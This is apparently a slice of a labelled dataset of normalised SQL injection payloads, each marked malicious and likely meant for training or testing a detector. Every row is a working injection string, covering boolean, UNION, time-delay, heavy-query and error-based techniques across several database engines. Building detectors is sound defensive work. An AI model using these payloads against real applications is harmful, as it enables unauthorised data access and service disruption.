row_index,payload_norm,label,sqli_type_hint
5340,1 where 4949 = 4949,1,
5341,"1 ) where 7881 = 7881 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
5342,1' ) ) waitfor delay '0:0:5' and ( ( 'amnf' like 'amnf,1,
5343,"1 ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) )",1,
5344,"-7379 union all select 9813,9813,9813,9813,9813,9813,9813,9813--",1,
5345,"select count ( * ) from generate_series ( 1,5000000 ) and 'fahy' like 'fahy",1,
5346,"1"" ) ) as dcrk where 5164 = 5164 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
5347,-8745' ) as xpwv where 8855 = 8855 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,1,
5348,"1 ) ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 4858 = 4858",1,
5349,1 ) where 1203 = 1203 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,1,
5350,"-2418'|| ( select 'mdbt' from dual where 3026 = 3026 union all select 3026,3026,3026,3026,3026,3026,3026,3026,3026--",1,
5351,1 where 3357 = 3357 and ( 9492 = 4334 ) *4334--,1,
5352,"1%' ) ) union all select null,null,null#",1,
5353,"1%"" ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ""%"" = """,1,
5354,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( ( ""%"" = """,1,
5355,"1"" ) ) as tncm where 8203 = 8203 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
5356,"1' ) ) ) and make_set ( 6094 = 2929,2929 ) and ( ( ( 'gkyo' = 'gkyo",1,
5357,1'|| ( select 'feyg' from dual where 7734 = 7734 and 3843 = 6724#,1,
5358,"1"" ) ) ) and 7533 = 7533 and ( ( ( ""xopd"" = ""xopd",1,
5359,"1%"" ) and elt ( 7436 = 9874,9874 ) and ( ""%"" = """,1,
5360,-2866' ) ) or 4491 = 9429#,1,
5361,"1' ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )",1,
5362,end and ( ( 'pfrt' = 'pfrt,1,
5363,1 ) as ozga where 4002 = 4002 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --,1,
5364,"iif ( 7011 = 2522,1,1/0 )",1,
5365,-4904' ) as ogyu where 2821 = 2821 or 5982 = 1643,1,
5366,-3339' or 8571 = 8571--,1,
5367,"1%' ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( '%' = '",1,
5368,"1"" or elt ( 6272 = 6272,sleep ( 5 ) ) and ""hvic"" like ""hvic",1,
5369,1' and ( 3020 = 3020 ) *6703 and 'hnvf' = 'hnvf,1,
